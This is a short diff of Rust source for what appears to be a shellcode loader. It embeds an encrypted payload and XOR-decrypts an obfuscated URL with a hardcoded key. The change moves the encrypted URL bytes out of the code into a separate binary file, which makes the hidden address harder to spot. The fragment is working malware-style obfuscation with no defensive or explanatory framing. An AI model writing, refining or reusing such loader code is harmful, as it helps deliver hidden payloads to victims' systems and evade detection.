@@ -203,9 +203,9 @@ fn main() -> Result<()> {
         let encrypted_shellcode: &[u8] = include_bytes!("enc_payload.bin");
         
         // decrypt URL
-        let url_bytes: [u8; 42] = [0x2f, 0x10, 0x16, 0x41, 0x03, 0x65, 0x4b, 0x41, 0x06, 0x1f, 0x52, 0x37, 0x69, 0x33, 0x4b, 0x26, 0x16, 0x07, 0x1f, 0x1f, 0x2d, 0x03, 0x41, 0x12, 0x11, 0x56, 0x21, 0x37, 0x6f, 0x12, 0x68, 0x17, 0x16, 0x50, 0x04, 0x36, 0x07, 0x41, 0x04, 0x19, 0x5d, 0x21];
+        let url_bytes: &[u8] = include_bytes!("url_bytes.bin");
         let url_key = b"Gdb1p_dnbp1DD@#";
-        let decrypted_url_vec = crypto_utils::xor_decrypt(&url_bytes, url_key);
+        let decrypted_url_vec = crypto_utils::xor_decrypt(url_bytes, url_key);
         let decrypted_url = match String::from_utf8(decrypted_url_vec) {
             Ok(s) => s,
             Err(_) => return Ok(()),
